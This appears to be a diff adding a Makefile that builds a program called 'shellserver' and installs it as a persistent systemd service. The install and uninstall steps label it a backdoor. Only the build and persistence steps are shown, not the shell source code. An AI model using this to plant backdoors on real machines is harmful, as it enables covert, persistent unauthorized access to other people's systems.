@@ -1,0 +1,42 @@
+CC = gcc
+CFLAGS = -Wall -Wextra -g
+TARGET = shellserver
+SERVICE_FILE = $(TARGET).service
+BIN_DIR = /bin
+SERVICE_DIR = /etc/systemd/system
+SRCS = $(TARGET).c shell.c etc.c
+OBJS = $(SRCS:.c=.o)
+
+all: $(TARGET)
+
+$(TARGET): $(OBJS)
+	$(CC) $(CFLAGS) -o $(TARGET) $(OBJS)
+
+%.o: %.c
+	$(CC) $(CFLAGS) -c $< -o $@
+
+install: $(TARGET)
+	@echo [-] Installing backdoor
+	install -m 755 $(TARGET) $(BIN_DIR)/$(TARGET)
+	install -m 644 $(SERVICE_FILE) $(SERVICE_DIR)/$(SERVICE_FILE)
+	systemctl daemon-reload
+	systemctl enable $(SERVICE_FILE)
+	@echo [-] Loading backdoor
+	systemctl start $(SERVICE_FILE)
+	@echo [-] Done
+
+uninstall:
+	@echo [-] Uninstalling backdoor
+	systemctl stop $(SERVICE_FILE)
+	systemctl disable $(SERVICE_FILE)
+	@echo [-] Removing backdoor files
+	rm -f $(BIN_DIR)/$(TARGET)
+	rm -f $(SERVICE_DIR)/$(SERVICE_FILE)
+	systemctl daemon-reload
+	@echo [-] Done
+
+clean:
+	rm -f $(TARGET) $(OBJS)
+
+.PHONY: all install uninstall clean
+
